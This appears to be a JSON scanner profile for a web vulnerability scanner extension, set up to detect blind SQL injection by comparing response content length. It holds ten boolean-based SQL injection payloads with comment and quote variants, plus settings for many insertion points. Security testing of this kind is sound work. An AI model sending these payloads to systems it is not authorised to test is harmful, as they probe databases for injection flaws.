[
  {
    "ProfileName": "BlindSQLi-ContentLength",
    "Name": "",
    "Enabled": false,
    "Scanner": 1,
    "Author": "@egarme",
    "Payloads": [
      "true, or 1\u003d2",
      "true, or 1\u003d2-- ",
      "true, or 1\u003d2#",
      "true, or 1\u003d2/*",
      "true, and 1\u003d2--",
      "true, and 1\u003d2",
      "true, and 1\u003d2#",
      "true, and 1\u003d2/*",
      "true,\u0027 or \u00271\u0027\u003d\u00272",
      "true,\u0027 and \u00271\u0027\u003d\u00272"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "3000",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 6,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "BlindSQLi-ContentLength",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "Blind SQL injection found.",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]